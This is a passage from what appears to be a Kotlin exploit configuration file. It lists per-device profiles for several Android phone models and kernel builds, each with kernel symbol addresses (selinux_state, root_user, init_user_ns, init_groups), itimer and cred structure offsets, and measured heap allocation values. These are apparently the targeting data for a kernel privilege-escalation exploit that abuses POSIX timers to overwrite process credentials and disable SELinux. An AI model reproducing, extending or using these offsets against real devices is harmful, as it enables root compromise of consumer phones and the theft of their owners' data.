            models = listOf("AMM-AN00"),
            release = "5.15.180-android13-8-g928f00c79361",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008579918uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B1393B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AAB2A20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AF83FB0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AAB42C0uL.toLong(),
                "init_groups" to 0xFFFFFFC00AAB3DF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x38194,
                taskAllocLow21 = 0x8D3E8,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMM-AN00 / 5.15.180-android13 · 21603b4",
            prefix = "5.15.180-android13-8-g21603b4ea1f9",
            models = listOf("AMM-AN00"),
            release = "5.15.180-android13-8-g21603b4ea1f9",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0085B241CuL.toLong(),
                "selinux_state" to 0xFFFFFFC00B16A3B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AAE2A20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AFB4130uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AAE42C0uL.toLong(),
                "init_groups" to 0xFFFFFFC00AAE3DF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x381FC,
                taskAllocLow21 = 0xC65EC,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMM-TN00 / 5.15.180-android13 · 4961434",
            prefix = "5.15.180-android13-8-g4961434d9598",
            models = listOf("AMM-TN00"),
            release = "5.15.180-android13-8-g4961434d9598",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008586918uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B1393B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AAB2A20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AF840B0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AAB42C0uL.toLong(),
                "init_groups" to 0xFFFFFFC00AAB3DF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x38194,
                taskAllocLow21 = 0x9A3E8,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMM-TN00 / 5.15.180-android13 · 09f8933",
            prefix = "5.15.180-android13-8-g09f89336e371",
            models = listOf("AMM-TN00"),
            release = "5.15.180-android13-8-g09f89336e371",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008579918uL.toLong(),
                "selinux_state" to 0xFFFFFFC00B1293B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AAA2A20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00AF73FB0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AAA42C0uL.toLong(),
                "init_groups" to 0xFFFFFFC00AAA3DF8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x8C,
                credSiteLow21 = 0x38194,
                taskAllocLow21 = 0x8D3E8,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMP-AN10 / 6.1.128-android14 · 286b85f",
            prefix = "6.1.128-android14-11-g286b85f34ae5",
            models = listOf("AMP-AN10"),
            release = "6.1.128-android14-11-g286b85f34ae5",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008381ED8uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6DA9B0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B0998uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0B0708uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B2228uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B1CB8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x95FFC,
                taskAllocLow21 = 0xB88B0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMP-AN10 / 6.1.128-android14 · bfe6fb3",
            prefix = "6.1.128-android14-11-gbfe6fb35bc83",
            models = listOf("AMP-AN10"),
            release = "6.1.128-android14-11-gbfe6fb35bc83",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008381ED8uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6DA9B0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B0998uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0B0708uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B2228uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B1CB8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x95FFC,
                taskAllocLow21 = 0xB88B0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMP-AN10 / 6.1.128-android14 · 0741060",
            prefix = "6.1.128-android14-11-g07410607dc1c",
            models = listOf("AMP-AN10"),
            release = "6.1.128-android14-11-g07410607dc1c",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0083819CCuL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6DA9B0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B0998uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0B0708uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B2228uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B1CB8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x95FFC,
                taskAllocLow21 = 0xB88B0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMP-AN10 / 6.1.128-android14 · faedf8d",
            prefix = "6.1.128-android14-11-gfaedf8de5b24",
            models = listOf("AMP-AN10"),
            release = "6.1.128-android14-11-gfaedf8de5b24",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008381D50uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6DA9B0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B0998uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0B0708uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B2228uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B1CB8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x95FFC,
                taskAllocLow21 = 0xB88B0,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-LGRP1 / 6.12.23-android16",
            prefix = "6.12.23-android16-5-g52ffb60eb2fc-abogki436399202-4k",
            models = listOf("BKQ-LGRP1"),
            release = "6.12.23-android16-5-g52ffb60eb2fc-abogki436399202-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080D46384uL.toLong(),
                "selinux_state" to 0xFFFFFFC082655570uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0823F15D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0823F1360uL.toLong(),
                "init_ucounts" to 0xFFFFFFC0823F2F70uL.toLong(),
                "init_groups" to 0xFFFFFFC0823F2AA0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0xE0298,
                taskAllocLow21 = 0x3A16C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-N49 / 6.12.23-android16 · a5f232d",
            prefix = "6.12.23-android16-5-ga5f232d1ead0-ab14083253-4k",
            models = listOf("BKQ-N49"),
            release = "6.12.23-android16-5-ga5f232d1ead0-ab14083253-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801DF884uL.toLong(),
                "selinux_state" to 0xFFFFFFC0826684F0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082401598uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082401320uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082402F30uL.toLong(),
                "init_groups" to 0xFFFFFFC082402A60uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10BBC8,
                taskAllocLow21 = 0xCF10C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-N49 / 6.12.38-android16 · 0de425e",
            prefix = "6.12.38-android16-5-g0de425e73a77-ab14804637-4k",
            models = listOf("BKQ-N49"),
            release = "6.12.38-android16-5-g0de425e73a77-ab14804637-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801E1DF0uL.toLong(),
                "selinux_state" to 0xFFFFFFC082678308uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0824117A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082411528uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082413138uL.toLong(),
                "init_groups" to 0xFFFFFFC082412C68uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10D4F4,
                taskAllocLow21 = 0xD090C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-N49 / 6.12.23-android16 · 13404bb",
            prefix = "6.12.23-android16-5-g13404bb4d51d-ab14275538-4k",
            models = listOf("BKQ-N49"),
            release = "6.12.23-android16-5-g13404bb4d51d-ab14275538-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801DF884uL.toLong(),
                "selinux_state" to 0xFFFFFFC0826684F0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082401598uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082401320uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082402F30uL.toLong(),
                "init_groups" to 0xFFFFFFC082402A60uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10BBC8,
                taskAllocLow21 = 0xCF10C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-N49 / 6.12.38-android16 · f69ca77",
            prefix = "6.12.38-android16-5-gf69ca77783f8-ab14605663-4k",
            models = listOf("BKQ-N49"),
            release = "6.12.38-android16-5-gf69ca77783f8-ab14605663-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801E1DF0uL.toLong(),
                "selinux_state" to 0xFFFFFFC082678308uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0824117A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082411528uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082413138uL.toLong(),
                "init_groups" to 0xFFFFFFC082412C68uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10D4F4,
                taskAllocLow21 = 0xD090C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BKQ-N49 / 6.12.38-android16 · d01bd4b",
            prefix = "6.12.38-android16-5-gd01bd4be3dda-ab14423277-4k",
            models = listOf("BKQ-N49"),
            release = "6.12.38-android16-5-gd01bd4be3dda-ab14423277-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801E1DF0uL.toLong(),
                "selinux_state" to 0xFFFFFFC082678308uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0824117A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082411528uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082413138uL.toLong(),
                "init_groups" to 0xFFFFFFC082412C68uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10D4F4,
                taskAllocLow21 = 0xD090C,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BRM-AN00 / 6.18.21-android17",
            prefix = "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k",
            models = listOf("BRM-AN00"),
            release = "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0803E1F18uL.toLong(),
                "selinux_state" to 0xFFFFFFC08299A6F0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082711390uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0827110E0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082712F08uL.toLong(),
                "init_groups" to 0xFFFFFFC082712A48uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x180, itimerNode = 0xE0, itimerHead = 0x100, itimerElist = 0x110,
                itimerFiring = 0x120, itimerHandling = 0x128,
                taskCred = 0x908, taskComm = 0x918,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x14CD90,
                taskAllocLow21 = 0x21574,
                taskAllocBytes = 0x1280,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BSN-AN10 / 6.12.58-android16",
            prefix = "6.12.58-android16-6-g1439620c9496-abogki524512671-4k",
            models = listOf("BSN-AN10"),
            release = "6.12.58-android16-6-g1439620c9496-abogki524512671-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC08051993CuL.toLong(),
                "selinux_state" to 0xFFFFFFC0827E7A20uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0825723A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082572128uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082573D38uL.toLong(),
                "init_groups" to 0xFFFFFFC082573868uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x19B950,
                taskAllocLow21 = 0x1D11D0,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BSN-N31 / 6.12.58-android16",
            prefix = "6.12.58-android16-6-g50d6c2424b3a-ab15726793-4k",
            models = listOf("BSN-N31"),
            release = "6.12.58-android16-6-g50d6c2424b3a-ab15726793-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080517770uL.toLong(),
                "selinux_state" to 0xFFFFFFC0827C6960uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082552360uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0825520E8uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082553CF8uL.toLong(),
                "init_groups" to 0xFFFFFFC082553828uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x1A8FD4,
                taskAllocLow21 = 0x1D1C40,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BSN-N51 / 6.12.58-android16",
            prefix = "6.12.58-android16-6-g09eda8c8505a-ab15950084-4k",
            models = listOf("BSN-N51"),
            release = "6.12.58-android16-6-g09eda8c8505a-ab15950084-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080517698uL.toLong(),
                "selinux_state" to 0xFFFFFFC0827C69A0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC082552370uL.toLong(),
                "init_user_ns" to 0xFFFFFFC0825520F8uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082553D08uL.toLong(),
                "init_groups" to 0xFFFFFFC082553838uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x19FDC4,
                taskAllocLow21 = 0x1D7440,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-AN20HP / 6.1.128-android14 · 84f1d56",
            prefix = "6.1.128-android14-11-g84f1d56830ff",
            models = listOf("BVL-AN20HP"),
            release = "6.1.128-android14-11-g84f1d56830ff",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008445DD0uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A827FA8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A1F2C20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A1F2990uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A1F44B0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A1F3F40uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x3E244,
                taskAllocLow21 = 0xFBB14,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-AN20HP / 6.1.128-android14 · d4936c4",
            prefix = "6.1.128-android14-11-gd4936c483bc7",
            models = listOf("BVL-AN20HP"),
            release = "6.1.128-android14-11-gd4936c483bc7",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0084460F0uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A827FA8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A1F2C20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A1F2990uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A1F44B0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A1F3F40uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x38D84,
                taskAllocLow21 = 0xE8BA8,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-AN20HP / 6.1.99-android14",
            prefix = "6.1.99-android14-11-g7c11f5fcbcdb",
            models = listOf("BVL-AN20HP"),
            release = "6.1.99-android14-11-g7c11f5fcbcdb",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008452DE4uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A816FC8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A1E2420uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A1E2190uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A1E3CB0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A1E3740uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x54400,
                taskAllocLow21 = 0x12018C,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-N19 / 6.1.157-android14 · 3416ba8",
            prefix = "6.1.157-android14-11-g3416ba8f00e3-ab15314546",
            models = listOf("BVL-N19"),
            release = "6.1.157-android14-11-g3416ba8f00e3-ab15314546",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008192E1CuL.toLong(),
                "selinux_state" to 0xFFFFFFC00A25A420uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A030780uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0304F0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A032008uL.toLong(),
                "init_groups" to 0xFFFFFFC00A031AA0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xA8,
                credSiteLow21 = 0xE4F18,
                taskAllocLow21 = 0xAA13C,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-N19 / 6.1.128-android14",
            prefix = "6.1.128-android14-11-g58deda01e47b-ab14263620",
            models = listOf("BVL-N19"),
            release = "6.1.128-android14-11-g58deda01e47b-ab14263620",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008191768uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A2283D0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A000740uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0004B0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A001FC8uL.toLong(),
                "init_groups" to 0xFFFFFFC00A001A60uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xA8,
                credSiteLow21 = 0xE44CC,
                taskAllocLow21 = 0xA972C,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "BVL-N19 / 6.1.157-android14 · c7dd3fa",
